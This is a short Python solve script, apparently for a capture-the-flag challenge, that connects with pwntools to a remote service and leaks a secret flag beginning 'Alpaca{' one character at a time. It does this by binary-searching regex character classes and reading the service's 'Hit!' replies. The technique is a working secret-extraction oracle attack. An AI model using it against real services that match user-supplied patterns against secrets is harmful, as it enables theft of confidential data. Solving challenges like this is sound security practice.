from pwn import remote

HOST = "34.170.146.252"
PORT = "46849"
TARGET_LEN = 22
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
current_flag = "Alpaca{"
io = remote(HOST, PORT)

io.recvuntil(b"regex> ")

while len(current_flag) < TARGET_LEN:
    candidates = CHARSET[:]

    while len(candidates) > 1:
        mid = len(candidates) // 2
        left_half = candidates[:mid]
        char_class = "[" + "".join(left_half) + "]"
        pattern = current_flag + char_class + ".*}"

        io.sendline(pattern.encode())

        response = io.recvline().decode().strip()

        if "Hit!" in response:
            candidates = left_half
        else:
            candidates = candidates[mid:]

        io.recvuntil(b"regex> ")

    current_flag += candidates[0]

io.close()
print(current_flag + "}")
